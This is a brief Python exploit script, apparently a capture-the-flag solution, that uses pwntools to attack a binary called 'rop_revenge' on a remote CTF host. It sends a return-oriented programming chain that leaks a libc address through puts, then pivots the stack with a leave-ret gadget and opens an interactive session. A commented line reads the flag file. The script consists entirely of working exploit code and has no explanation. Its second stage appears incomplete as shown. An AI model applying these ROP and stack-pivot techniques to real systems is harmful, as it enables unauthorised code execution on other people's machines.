#!/usr/bin/env python
from pwn import *

# 

context.arch = 'amd64'

e , l = ELF('./rop_revenge') , ELF('./libc.so.6')

host , port = 'ctf.yuawn.idv.tw' , 10109
y = remote( host , port )

name = 0x601080
main = 0x400636
pop_rdi = 0x400723
pop_rsi_r15 = 0x400721
leave_ret = 0x4006bd

p = flat(
    pop_rdi,
    e.got['__libc_start_main'],
    e.plt['puts'],
    main
)

y.sendafter( '?' , p )

sleep(1)

p = flat(
    'D' * 0x20,
    name - 8,
    leave_ret
)

y.send(p)

#y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()